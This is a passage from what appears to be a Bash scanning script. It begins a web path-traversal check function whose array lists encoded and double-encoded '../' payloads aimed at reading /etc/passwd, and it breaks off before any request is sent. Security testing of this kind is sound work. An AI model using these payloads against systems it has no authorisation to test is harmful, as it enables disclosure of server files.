    # ── Web path traversal ────────────────────────────────────────
    _web_traversal() {
        local _sc="$1" _po="$2"
        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
        local _payloads=(
            "/../../../etc/passwd"
            "/..%2F..%2F..%2Fetc%2Fpasswd"
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            "/cgi-bin/../../../../etc/passwd"
            "/..%252F..%252F..%252Fetc%252Fpasswd"
